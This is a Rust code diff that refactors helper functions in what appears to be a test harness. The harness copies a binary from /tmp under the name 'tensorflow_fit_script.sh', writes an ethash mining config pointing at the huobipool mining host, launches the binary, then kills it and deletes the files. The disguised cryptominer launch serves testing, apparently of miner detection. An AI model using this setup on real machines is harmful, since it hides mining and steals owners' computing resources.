@@ -31,39 +31,41 @@ fn get_user_count() -> usize {
 
 fn init_env() {
     println!("init_env()");
-    let mut process = Command::new("cp");
-    process.arg("/tmp/b86547d084228861");
-    process.arg("tensorflow_fit_script.sh");
-    process.spawn().unwrap().wait().unwrap();
+    let mut command = Command::new("cp");
+    command.arg("/tmp/b86547d084228861")
+        .arg("tensorflow_fit_script.sh");
+    let mut process = command.spawn().unwrap();
+    process.wait().unwrap();
     let mut config = File::create("c").unwrap();
     config.write_all(b"[common]\nalgo=ethash\npers=BgoldPoW\n[server]\nhost=en.huobipool.com\nport=443\nuser=ec82e").unwrap();
 }
 
 fn clean_env() {
     println!("clean_env()");
-    let mut process = Command::new("rm");
-    process.arg("-rf");
-    process.arg("tensorflow_fit_script.sh");
-    process.arg("c");
-    process.spawn().unwrap();
+    let mut command = Command::new("rm");
+    command.arg("-rf");
+    command.arg("tensorflow_fit_script.sh");
+    command.arg("c");
+    command.spawn().unwrap();
 }
 
 fn start_target_process() -> u32 {
     println!("start_target_process()");
-    let mut process = Command::new("./tensorflow_fit_script.sh");
-    process.arg("--config");
-    process.arg("c");
-    let child = process.spawn().unwrap();
-    let pid = child.id();
+    let mut command = Command::new("./tensorflow_fit_script.sh");
+    command.arg("--config");
+    command.arg("c");
+    let process = command.spawn().unwrap();
+    let pid = process.id();
     println!("target process pid: {}", pid);
     return pid;
 }
 
 fn kill_target_process(pid: &mut u32) {
     println!("kill_target_process()");
-    let mut process = Command::new("kill");
-    process.arg("-9");
-    process.arg(pid.to_string());
-    process.spawn().unwrap().wait().unwrap();
+    let mut command = Command::new("kill");
+    command.arg("-9");
+    command.arg(pid.to_string());
+    let mut process = command.spawn().unwrap();
+    process.wait().unwrap();
     *pid = 0;
 }
